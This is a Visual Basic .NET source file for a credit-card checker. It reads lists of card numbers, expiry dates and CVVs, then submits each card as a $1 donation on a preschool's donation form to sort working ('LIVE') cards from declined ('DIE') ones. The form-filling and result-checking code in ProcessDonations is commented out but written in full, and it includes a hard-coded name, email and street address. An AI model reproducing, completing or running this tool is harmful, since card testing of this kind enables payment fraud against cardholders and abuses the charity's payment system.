Imports CefSharp.WinForms
Imports CefSharp
 
Public Class Form1
 
    Private WithEvents browser As ChromiumWebBrowser
 
    Public Sub New()
        InitializeComponent()
 
        Dim settings As New CefSettings()
        CefSharp.Cef.Initialize(settings)
 
        browser = New ChromiumWebBrowser("https://druidhillspreschool.org/relocate/index.php") With {
            .Dock = DockStyle.Fill
            }
        panBrowser.Controls.Add(browser)
 
    End Sub
    
    ''' <summary>
    ''' Abre el archivo
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub btnOpen_Click(sender As Object, e As EventArgs) Handles btnOpen.Click
        OpenFileDialog.ShowDialog()
        Dim filename = OpenFileDialog.FileName
        Try
            '========================================== 
            Dim separator As Char
            Dim datagrid As New DataTable
            Dim dr As DataRow
            '========================================== 
            lblStatus.Text = "Tarjetas cargadas..."
            lblStatus.ForeColor = Color.Red

            datagrid.Columns.Add("CC")
            datagrid.Columns.Add("MES")
            datagrid.Columns.Add("AÑO")
            datagrid.Columns.Add("CVV")
            dr = datagrid.NewRow()
            '========================================== 
            Dim file As New System.IO.StreamReader(filename)
            separator = "|"
            While file.Peek() <> -1
                datagrid.Rows.Add(file.ReadLine().Split(separator))
            End While
            dgwDataCard.DataSource = datagrid
            'Me.cbCartao.Enabled = True
            dgwDataCard.CurrentRow.Selected = True
            '==========================================
        Catch ex As Exception
            '==========================================
        End Try

        'lblContador.Text = Convert.ToString(DataGridView1.Rows.Count - 1)
        Dim tmn As Integer

        For tmn = 0 To dgwDataCard.ColumnCount - 1
            If tmn = dgwDataCard.ColumnCount - 1 Then
                dgwDataCard.Columns(tmn).AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill
            Else
                dgwDataCard.Columns(tmn).AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells
            End If
        Next
    End Sub

    Private Sub btnInit_Click(sender As Object, e As EventArgs) Handles btnInit.Click
        lblstatus.Text = "Autorizando donaciones..."
        lblstatus.ForeColor = Color.Yellow 
        ' Procesamos las donaciones
        ProcessDonations()
    End Sub

    ''' <summary>
    ''' Procesa las donaciones de los registros de la grilla del fromulario
    ''' </summary>
    Private Sub ProcessDonations()
        
        For Each row As DataGridViewRow In dgwDataCard.Rows
            If row.Index = dgwDataCard.Rows.Count - 1  Then
                Exit For 
            End If                        
            Dim canReadResult = False 
            While Not canReadResult
                lblstatus.Text = "Autorizando donaciones...#" + Convert.ToString(row.Index +1)
                lblstatus.ForeColor = Color.Blue 
                row.DefaultCellStyle.BackColor = Color.LightSkyBlue
                'Navegamos a la web para donacion
                browser.Load("http://www.google.com.ar")
                'browser.Load("https://druidhillspreschool.org/relocate/index.php")                
                
                'Application.DoEvents
                'While WebBrowser1.ReadyState <> WebBrowserReadyState.Complete 
                '    Application.DoEvents 
                'End While
            
                ''Valores por defecto
                'For Each radio As HtmlElement In WebBrowser1.Document.All.GetElementsByName("radio_amount")
                '    If radio.GetAttribute("value") = "other_amount" Then
                '        radio.SetAttribute("checked", "true")
                '    End If
                'Next
                'WebBrowser1.Document.All.GetElementsByName("other_amount").Item(0).SetAttribute("value", "1")
                'WebBrowser1.Document.All.GetElementsByName("name").Item(0).SetAttribute("value", "piero espire")
                'WebBrowser1.Document.All.GetElementsByName("email").Item(0).SetAttribute("value", "empresadeperritos@gmail.com")
                'WebBrowser1.Document.All.GetElementsByName("cardholder_name").Item(0).SetAttribute("value", "piero espire")
                'WebBrowser1.Document.All.GetElementsByName("cardholder_name").Item(0).SetAttribute("value", "piero espire")
                'For Each input As HtmlElement In WebBrowser1.Document.GetElementsByTagName("input")
                '    If input.GetAttribute("data-stripe") = "number" Then
                '        input.SetAttribute("value", Conversions.ToString(row.Cells(0).Value))
                '    End If                    
                'Next
                'For Each selectHtml As HtmlElement In WebBrowser1.Document.GetElementsByTagName("select")
                '    If selectHtml.GetAttribute("data-stripe") = "exp-month" Then
                '        selectHtml.SetAttribute("value", Conversions.ToByte(row.Cells(1).Value).ToString)
                '    End If                    
                '    If selectHtml.GetAttribute("data-stripe") = "exp-year" Then
                '        selectHtml.SetAttribute("value", Conversions.ToInteger(row.Cells(2).Value).ToString)
                '    End If                    
                'Next
                'WebBrowser1.Document.All.GetElementsByName("cvc").Item(0).SetAttribute("value", Conversions.ToString(row.Cells(3).Value))

                'WebBrowser1.Document.GetElementById("input_6_1").SetAttribute("value", "1")
                'WebBrowser1.Document.GetElementById("choice_6_9_1").SetAttribute("checked", "checked")            
                'WebBrowser1.Document.GetElementById("input_6_3_3").SetAttribute("value", "piero")
                'WebBrowser1.Document.GetElementById("input_6_3_6").SetAttribute("value", "espire")
                'WebBrowser1.Document.GetElementById("input_6_5").SetAttribute("value", "empresadeperritos@gmail.com")          
                'WebBrowser1.Document.GetElementById("input_6_4_1").SetAttribute("value", "9990 NW 14th Street")
                'WebBrowser1.Document.GetElementById("input_6_4_3").SetAttribute("value", "miami")                                     
                'WebBrowser1.Document.GetElementById("input_6_4_4").SetAttribute("value", "florida")
                'WebBrowser1.Document.GetElementById("input_6_4_5").SetAttribute("value", "33126")
                'WebBrowser1.Document.GetElementById("input_6_2_5").SetAttribute("value", "piero espire")
                ''Selecionar United States
                'Dim CountryElement As HtmlElement = WebBrowser1.Document.GetElementById("input_6_4_6")
                'Dim UnitedStateElement As HtmlElement = CountryElement.GetElementsByTagName("option").Cast(Of HtmlElement).First(Function(el) el.GetAttribute("value") = "United States")
                'UnitedStateElement.SetAttribute("selected", "true")
                ''Valores de la grilla
                'WebBrowser1.Document.GetElementById("input_6_2_1").SetAttribute("value", Conversions.ToString(row.Cells(0).Value))
                'WebBrowser1.Document.GetElementById("input_6_2_2_month").SetAttribute("value", Conversions.ToString(row.Cells(1).Value))
                'WebBrowser1.Document.GetElementById("input_6_2_2_year").SetAttribute("value", Conversions.ToString(row.Cells(2).Value))
                'WebBrowser1.Document.GetElementById("input_6_2_3").SetAttribute("value", Conversions.ToString(row.Cells(3).Value))

                ''Invocamos a subimit                
                'Dim var = WebBrowser1.Document.Forms(0).InvokeMember("submit")
                'Thread.Sleep(1500)                
                'Application.DoEvents 
                'While WebBrowser1.ReadyState <> WebBrowserReadyState.Complete 
                '    Application.DoEvents 
                'End While                
                
                'Verificamos resultados del submit                                        
                'While Not canReadResult                    
                '    lblstatus.Text = "Esperando respuesta" + DateTime.Now.ToString                        
                '    If WebBrowser1.Document.Body.InnerHtml.Contains("Thank") Then
                '        Aprovadas.Items.Add("🎶 LIVE " + row.Cells(0).Value + "|" + row.Cells(1).Value + "|" + row.Cells(2).Value + "|" + row.Cells(3).Value + " $ #bySkooty")                
                '        lblstatus.Text = "Autorizando donaciones...Aprovada"
                '        lblstatus.ForeColor = Color.Lime
                '        lblaprovadas.Text = Aprovadas.Items.Count.ToString
                '        'Me.deletaprimeralinha(Me.ar)
                '        row.DefaultCellStyle.BackColor = Color.Green             
                '    canReadResult  = True 
                '    ElseIf WebBrowser1.Document.Body.InnerHtml.Contains("There was a problem") Then
                '        Me.Reprovadas.Items.Add("✗ DIE " + row.Cells(0).Value + "|" + row.Cells(1).Value + "|" + Me.DataGridView1.CurrentRow.Cells(2).Value + "|" + row.Cells(3).Value + "  #bySkooty")
                '        lblstatus.Text = "Autorizando donaciones...Reprovada"                
                '        lblstatus.ForeColor = Color.Red
                '        lblreprovadas.Text = Reprovadas.Items.Count.ToString
                '        'Me.deletaprimeralinha(Me.ar)
                '        row.DefaultCellStyle.BackColor = Color.Red 
                '        canReadResult  = True 
                '    End If                                    
                'End While
                canReadResult = True
            End While            
        Next
        lblstatus.Text = "Proceso de autorización de donaciones finalizado"                
        lblstatus.ForeColor = Color.Black 
        'WebBrowser1.Visible = False 
    End Sub
End Class
